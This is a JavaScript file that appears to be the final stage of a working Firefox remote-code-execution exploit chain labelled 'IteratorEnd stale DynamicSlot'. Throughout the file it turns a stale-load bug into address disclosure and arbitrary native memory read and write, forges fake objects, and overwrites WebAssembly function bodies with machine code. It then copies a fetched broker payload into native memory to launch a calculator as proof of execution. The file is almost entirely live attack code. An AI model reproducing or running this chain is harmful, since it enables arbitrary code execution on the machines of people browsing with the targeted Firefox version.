"use strict";

let fullChainStage = "tail_start";
(async function runFullStockCalculatorChain() {
  const started = performance.now();
  const api = globalThis.stockPrimitiveApi;
  const SAFE_VALUE = 0xfff8800000000000n;
  const OBJECT_TAG = 0xfffe000000000000n;
  const DYNAMIC_SLOT_INDEX = 75n;
  const DYNAMIC_SLOT_BIAS = DYNAMIC_SLOT_INDEX * 8n;
  const MARKER_MAGIC = 0x52434521n;
  const BROKER_SEND_MAGIC = 0x444e4553;
  const BROKER_PAYLOAD_LENGTH = 547;
  const BROKER_SOURCE_OFFSET = 0x1000;
  const BROKER_BACKUP_OFFSET = 0x2000;
  const BROKER_VERIFY_OFFSET = 0x2400;

  if (!api || typeof api.rw !== "function") {
    throw new Error("validated stock primitive API is unavailable");
  }

  api.wasm.set(api.carrier, api.arrayIndex, SAFE_VALUE);

  const hex64 = value =>
    "0x" + BigInt.asUintN(64, value).toString(16).padStart(16, "0");
  const bitsBuffer = new ArrayBuffer(8);
  const bitsF64 = new Float64Array(bitsBuffer);
  const bitsU64 = new BigUint64Array(bitsBuffer);
  function bitsToNumber(bits) {
    bitsU64[0] = BigInt.asUintN(64, bits);
    return bitsF64[0];
  }
  function numberToBits(value) {
    bitsF64[0] = value;
    return bitsU64[0];
  }

  fullChainStage = "asset_fetch";
  const cacheBust = Date.now();
  const [markerResponse, brokerWasmResponse, brokerPayloadResponse] =
    await Promise.all([
      fetch("firefox-152.0.6-rce-marker.wasm?t=" + cacheBust, {
        cache: "no-store", credentials: "omit"
      }),
      fetch("broker-stage.wasm?t=" + cacheBust, {
        cache: "no-store", credentials: "omit"
      }),
      fetch("broker_calculator_stage.bin?t=" + cacheBust, {
        cache: "no-store", credentials: "omit"
      })
    ]);
  if (!markerResponse.ok || !brokerWasmResponse.ok ||
      !brokerPayloadResponse.ok) {
    throw new Error(
      "asset fetch failed: marker=" + markerResponse.status +
      " broker_wasm=" + brokerWasmResponse.status +
      " broker_payload=" + brokerPayloadResponse.status
    );
  }

  const markerBytes = new Uint8Array(await markerResponse.arrayBuffer());
  const brokerWasmBytes =
    new Uint8Array(await brokerWasmResponse.arrayBuffer());
  const brokerPayloadBytes =
    new Uint8Array(await brokerPayloadResponse.arrayBuffer());
  if (markerBytes.length !== 83 || brokerWasmBytes.length !== 3426 ||
      brokerPayloadBytes.length !== BROKER_PAYLOAD_LENGTH) {
    throw new Error(
      "unexpected asset size: marker=" + markerBytes.length +
      " broker_wasm=" + brokerWasmBytes.length +
      " broker_payload=" + brokerPayloadBytes.length
    );
  }

  fullChainStage = "wasm_materialization";
  const markerResult = await WebAssembly.instantiate(markerBytes);
  const brokerResult = await WebAssembly.instantiate(brokerWasmBytes);
  const markerInstance = markerResult.instance;
  const brokerInstance = brokerResult.instance;
  const markerFn = markerInstance.exports.marker;
  const markerMemory = new Uint8Array(markerInstance.exports.memory.buffer);
  const brokerStageFn = brokerInstance.exports.stage;
  const brokerMemory = new Uint8Array(brokerInstance.exports.memory.buffer);
  const brokerView = new DataView(brokerMemory.buffer);
  for (let i = 0; i < 1000; i++) {
    markerFn(0n, 0n, 0, 0);
  }
  brokerStageFn(0n, 0n, 0, 0);
  markerMemory.fill(0, 0, markerMemory.length);
  markerMemory.set(brokerPayloadBytes, BROKER_SOURCE_OFFSET);
  brokerMemory.fill(0, 0x70, 0x1c0);
  brokerMemory.set([
    0x63, 0x61, 0x6c, 0x63, 0x75, 0x6c, 0x61, 0x74,
    0x6f, 0x72, 0x3a, 0x00
  ], 0x3000);
  brokerMemory.set([
    0x7b, 0x22, 0x32, 0x22, 0x3a, 0x7b, 0x22, 0x30,
    0x22, 0x3a, 0x5b, 0x7b, 0x22, 0x33, 0x22, 0x3a,
    0x7b, 0x7d, 0x7d, 0x5d, 0x7d, 0x7d, 0x00
  ], 0x3040);

  fullChainStage = "object_preparation";
  const victim = {};
  for (let i = 0; i < 80; i++) {
    victim["p" + i] = 100.25 + i;
  }
  const fakeObjectStorage = new BigUint64Array(8);
  const nativeTargetStorage = new BigUint64Array(1);

  function getP79(object) {
    return object.p79;
  }
  function setP79(object, value) {
    object.p79 = value;
  }
  for (let i = 0; i < 2000; i++) {
    const value = getP79(victim);
    setP79(victim, value);
  }

  globalThis.fullStockChainRoots = {
    markerBytes,
    brokerWasmBytes,
    brokerPayloadBytes,
    markerInstance,
    brokerInstance,
    markerFn,
    brokerStageFn,
    markerMemory,
    brokerMemory,
    victim,
    fakeObjectStorage,
    nativeTargetStorage
  };
  fullChainStage = "object_tenure";
  for (let i = 0; i < 2000000; i++) {
    globalThis.fullStockChainTenureSink = {
      x: i,
      y: i ^ 0x13579bdf
    };
  }

  const objectTag = api.leakedRaw & (api.mask64 ^ api.payloadMask);
  if (objectTag !== OBJECT_TAG) {
    throw new Error("unexpected object tag " + hex64(objectTag));
  }

  fullChainStage = "address_disclosure";
  const addrofRetriggers = [];
  function requireRetrigger(label) {
    const iteration = api.retriggerStaleRead();
    if (iteration < 0) {
      throw new Error("stale-load retrigger failed: " + label);
    }
    addrofRetriggers.push(label + ":" + iteration);
    return iteration;
  }
  function addrof(value, label) {
    requireRetrigger(label + "_before");
    api.wasm.set(api.carrier, api.arrayIndex, SAFE_VALUE);
    api.rw(api.source, value, true);
    const raw = BigInt.asUintN(
      64, api.wasm.get(api.carrier, api.arrayIndex));
    if ((raw & (api.mask64 ^ api.payloadMask)) !== OBJECT_TAG ||
        (raw & api.payloadMask) === 0n) {
      throw new Error(label + " addrof failed: " + hex64(raw));
    }
    requireRetrigger(label + "_after");
    return raw & api.payloadMask;
  }

  const victimAddress = addrof(victim, "victim");
  const fakeObjectStorageAddress =
    addrof(fakeObjectStorage, "fake object storage");
  const nativeTargetStorageAddress =
    addrof(nativeTargetStorage, "native target storage");
  const markerFunctionAddress = addrof(markerFn, "marker function");
  const brokerFunctionAddress = addrof(brokerStageFn, "broker function");
  const markerMemoryAddress = addrof(markerMemory, "marker memory view");
  const refreshedFakeStorageAddress =
    addrof(api.fakeStorage, "refreshed fake BigInt storage");
  const refreshedFakeBigIntAddress = refreshedFakeStorageAddress + 0x38n;
  const refreshedFakeBigIntRaw =
    api.bigIntTag | refreshedFakeBigIntAddress;
  const fakeObjectAddress = fakeObjectStorageAddress + 0x38n;
  const nativeMarkerTarget = nativeTargetStorageAddress + 0x38n;
  const fakeObjectRaw = OBJECT_TAG | fakeObjectAddress;

  fullChainStage = "native_read_setup";
  function readNative64(address) {
    api.fakeStorage[0] = 2n << 32n;
    api.fakeStorage[1] = address;
    api.wasm.set(api.carrier, api.arrayIndex, refreshedFakeBigIntRaw);
    let fake = api.rw(api.source, null, false);
    const valid = typeof fake === "bigint";
    if (valid) {
      api.wasm.capture(fake);
    }
    fake = null;
    api.wasm.set(api.carrier, api.arrayIndex, SAFE_VALUE);
    if (!valid) {
      throw new Error("forged BigInt stale-load failed");
    }
    return BigInt.asUintN(64, api.wasm.release());
  }

  const markerLinearBase = readNative64(markerMemoryAddress + 0x30n);
  let expectedPayloadQword0 = 0n;
  for (let i = 0; i < 8; i++) {
    expectedPayloadQword0 |= BigInt(brokerPayloadBytes[i]) << BigInt(i * 8);
  }
  if (markerLinearBase === 0n || (markerLinearBase & 7n) !== 0n ||
      readNative64(markerLinearBase + BigInt(BROKER_SOURCE_OFFSET)) !==
        expectedPayloadQword0) {
    throw new Error("absolute marker linear-memory base validation failed");
  }

  const objectShape = readNative64(victimAddress);
  const objectSlots = readNative64(victimAddress + 8n);
  const objectElements = readNative64(victimAddress + 0x10n);
  const victimP79Bits =
    readNative64(objectSlots + DYNAMIC_SLOT_INDEX * 8n);
  if (victimP79Bits !== numberToBits(victim.p79)) {
    throw new Error("OBJECT4 p79 dynamic-slot calibration failed");
  }

  fakeObjectStorage[0] = objectShape;
  fakeObjectStorage[1] = objectSlots;
  fakeObjectStorage[2] = objectElements;
  for (let i = 0; i < 4; i++) {
    fakeObjectStorage[3 + i] =
      readNative64(victimAddress + 0x18n + BigInt(i * 8));
  }
  fakeObjectStorage[7] = 0n;
  if (readNative64(fakeObjectAddress) !== objectShape) {
    throw new Error("fake PlainObject inline address calibration failed");
  }

  function writeNative64(address, bits) {
    const value = bitsToNumber(bits);
    if (!Number.isFinite(value)) {
      throw new Error("non-finite write word " + hex64(bits));
    }
    fakeObjectStorage[1] = address - DYNAMIC_SLOT_BIAS;
    api.wasm.set(api.carrier, api.arrayIndex, fakeObjectRaw);
    let forged = api.rw(api.source, null, false);
    const valid = typeof forged === "object" && forged !== null;
    if (valid) {
      setP79(forged, value);
    }
    forged = null;
    api.wasm.set(api.carrier, api.arrayIndex, SAFE_VALUE);
    if (!valid) {
      throw new Error("forged PlainObject stale-load failed");
    }
  }

  fullChainStage = "bounded_native_write";
  const boundedBefore = 0x1122334455667788n;
  const boundedAfter = 0x4142434445464748n;
  nativeTargetStorage[0] = boundedBefore;
  writeNative64(nativeMarkerTarget, boundedAfter);
  const boundedObserved = nativeTargetStorage[0];
  writeNative64(nativeMarkerTarget, boundedBefore);
  if (boundedObserved !== boundedAfter ||
      nativeTargetStorage[0] !== boundedBefore) {
    throw new Error("bounded native write/restore failed");
  }

  const markerBody = readNative64(markerFunctionAddress + 0x38n);
  const brokerBody = readNative64(brokerFunctionAddress + 0x38n);
  if (markerBody === 0n || brokerBody === 0n ||
      (markerBody & 7n) !== 0n || (brokerBody & 7n) !== 0n) {
    throw new Error("invalid registered Wasm body pointer");
  }

  const markerOriginal = [];
  for (let i = 0; i < 2; i++) {
    const word = readNative64(markerBody + BigInt(i * 8));
    if (!Number.isFinite(bitsToNumber(word))) {
      throw new Error("marker original word is not finite at index " + i);
    }
    markerOriginal.push(word);
  }

  let markerDirty = false;
  function writeMarkerWord(index, word) {
    writeNative64(markerBody + BigInt(index * 8), word);
    markerDirty = true;
  }
  function verifyMarkerWords(words) {
    for (let i = 0; i < words.length; i++) {
      if (readNative64(markerBody + BigInt(i * 8)) !== words[i]) {
        return false;
      }
    }
    return true;
  }
  function restoreMarkerBody() {
    for (let i = 0; i < markerOriginal.length; i++) {
      writeNative64(markerBody + BigInt(i * 8), markerOriginal[i]);
    }
    const restored = verifyMarkerWords(markerOriginal);
    markerDirty = !restored;
    if (!restored) {
      throw new Error("marker body restoration failed");
    }
  }

  fullChainStage = "native_marker";
  const patched0 = 0x01b85243452101c7n;
  const patched1 =
    (markerOriginal[1] & 0xffffffff00000000n) | 0xc3000000n;
  let markerReturn = -1;
  let markerValue = 0n;
  let markerPatchVerified = false;
  let markerRestored = false;
  try {
    writeMarkerWord(0, patched0);
    writeMarkerWord(1, patched1);
    markerPatchVerified =
      readNative64(markerBody) === patched0 &&
      readNative64(markerBody + 8n) === patched1;
    if (!markerPatchVerified) {
      throw new Error("native marker patch did not verify");
    }
    nativeTargetStorage[0] = 0n;
    markerReturn = markerFn(nativeMarkerTarget, 0n, 0, 0);
    markerValue = nativeTargetStorage[0];
  } finally {
    restoreMarkerBody();
    markerRestored = true;
  }
  const nativeMarkerVerified =
    markerReturn === 1 &&
    (markerValue & 0xffffffffn) === MARKER_MAGIC &&
    markerPatchVerified && markerRestored;
  if (!nativeMarkerVerified) {
    throw new Error("native marker invocation failed");
  }
  report("native_marker_success", {
    marker_function: hex64(markerFunctionAddress),
    marker_body: hex64(markerBody),
    marker_return: markerReturn,
    marker_value: hex64(markerValue),
    marker_restored: markerRestored,
    elapsed_ms: (performance.now() - started).toFixed(3)
  });

  fullChainStage = "broker_copy";
  const absoluteMemcpyStub = [
    0xd78948ce89485756n,
    0xc35e5fa4f3c18944n
  ];
  let brokerBackedUp = false;
  let brokerPatched = false;
  let brokerPayloadVerified = false;
  let brokerBodyRestored = false;
  let brokerFirstReturn = -1;
  let brokerSecondReturn = -1;
  let brokerFirstStatus = 0;
  let brokerSecondStatus = 0;

  function installCopyStub() {
    for (let i = 0; i < absoluteMemcpyStub.length; i++) {
      writeMarkerWord(i, absoluteMemcpyStub[i]);
    }
    if (!verifyMarkerWords(absoluteMemcpyStub)) {
      throw new Error("absolute memcpy stub did not verify");
    }
  }
  function copyAbsolute(sourceAddress, destinationAddress, length) {
    installCopyStub();
    markerFn(sourceAddress, destinationAddress, length, 0);
  }

  let primaryError = null;
  try {
    copyAbsolute(
      brokerBody,
      markerLinearBase + BigInt(BROKER_BACKUP_OFFSET),
      BROKER_PAYLOAD_LENGTH
    );
    brokerBackedUp = true;
    copyAbsolute(
      markerLinearBase + BigInt(BROKER_SOURCE_OFFSET),
      brokerBody,
      BROKER_PAYLOAD_LENGTH
    );
    brokerPatched = true;
    copyAbsolute(
      brokerBody,
      markerLinearBase + BigInt(BROKER_VERIFY_OFFSET),
      BROKER_PAYLOAD_LENGTH
    );
    brokerPayloadVerified = brokerPayloadBytes.every(
      (byte, index) =>
        markerMemory[BROKER_VERIFY_OFFSET + index] === byte
    );
    if (!brokerPayloadVerified) {
      throw new Error("broker payload native copy did not verify");
    }

    restoreMarkerBody();
    fullChainStage = "broker_dispatch";
    brokerFirstReturn = brokerStageFn(0n, 0n, 0, 0);
    brokerFirstStatus = brokerView.getUint32(0x7c, true);
    brokerSecondReturn = brokerStageFn(0n, 0n, 0, 0);
    brokerSecondStatus = brokerView.getUint32(0x7c, true);
  } catch (error) {
    primaryError = error;
  } finally {
    try {
      if (brokerBackedUp && brokerPatched) {
        copyAbsolute(
          markerLinearBase + BigInt(BROKER_BACKUP_OFFSET),
          brokerBody,
          BROKER_PAYLOAD_LENGTH
        );
        copyAbsolute(
          brokerBody,
          markerLinearBase + BigInt(BROKER_VERIFY_OFFSET),
          BROKER_PAYLOAD_LENGTH
        );
        brokerBodyRestored = true;
        for (let i = 0; i < BROKER_PAYLOAD_LENGTH; i++) {
          if (markerMemory[BROKER_VERIFY_OFFSET + i] !==
              markerMemory[BROKER_BACKUP_OFFSET + i]) {
            brokerBodyRestored = false;
            break;
          }
        }
      }
      if (markerDirty) {
        restoreMarkerBody();
      }
    } catch (restoreError) {
      if (primaryError === null) {
        primaryError = restoreError;
      } else {
        primaryError = new Error(
          primaryError.message + "; restoration: " + restoreError.message
        );
      }
    }
    fakeObjectStorage[1] = objectSlots;
    api.wasm.set(api.carrier, api.arrayIndex, SAFE_VALUE);
  }
  if (primaryError !== null) {
    throw primaryError;
  }

  const brokerDispatchVerified =
    brokerFirstReturn === 1 && brokerSecondReturn === 1 &&
    brokerFirstStatus === BROKER_SEND_MAGIC &&
    brokerSecondStatus === BROKER_SEND_MAGIC;
  if (!brokerDispatchVerified || !brokerBodyRestored || markerDirty) {
    throw new Error(
      "broker completion failed: returns=" + brokerFirstReturn + "," +
      brokerSecondReturn + " statuses=0x" +
      brokerFirstStatus.toString(16) + ",0x" +
      brokerSecondStatus.toString(16) +
      " broker_restored=" + brokerBodyRestored +
      " marker_dirty=" + markerDirty
    );
  }

  const successFields = {
    user_agent: navigator.userAgent,
    exploit: "IteratorEnd stale DynamicSlot",
    victim: hex64(victimAddress),
    fake_object: hex64(fakeObjectAddress),
    bounded_write: boundedObserved === boundedAfter,
    marker_function: hex64(markerFunctionAddress),
    marker_body: hex64(markerBody),
    marker_return: markerReturn,
    native_marker: hex64(markerValue),
    native_marker_verified: nativeMarkerVerified,
    broker_function: hex64(brokerFunctionAddress),
    broker_body: hex64(brokerBody),
    broker_payload_bytes: BROKER_PAYLOAD_LENGTH,
    broker_payload_verified: brokerPayloadVerified,
    broker_first_return: brokerFirstReturn,
    broker_second_return: brokerSecondReturn,
    broker_first_status: "0x" +
      brokerFirstStatus.toString(16).padStart(8, "0"),
    broker_second_status: "0x" +
      brokerSecondStatus.toString(16).padStart(8, "0"),
    broker_body_restored: brokerBodyRestored,
    marker_body_restored: !markerDirty,
    addrof_retriggers: addrofRetriggers.join(","),
    elapsed_ms: (performance.now() - started).toFixed(3)
  };
  report("broker_dispatch_success", successFields);
  report("calc_success", successFields);
  document.title = "STOCK FIREFOX CALCULATOR CHAIN DISPATCHED";
})().catch(error => {
  try {
    const api = globalThis.stockPrimitiveApi;
    if (api) {
      api.wasm.set(api.carrier, api.arrayIndex, 0xfff8800000000000n);
    }
  } catch (_) {
  }
  report("calc_failure", {
    stage: fullChainStage,
    error_name: error && error.name,
    error_message: String(error && error.message || error),
    error_stack: String(error && error.stack || "")
  });
  document.title = "STOCK FIREFOX CALCULATOR CHAIN FAILED";
});
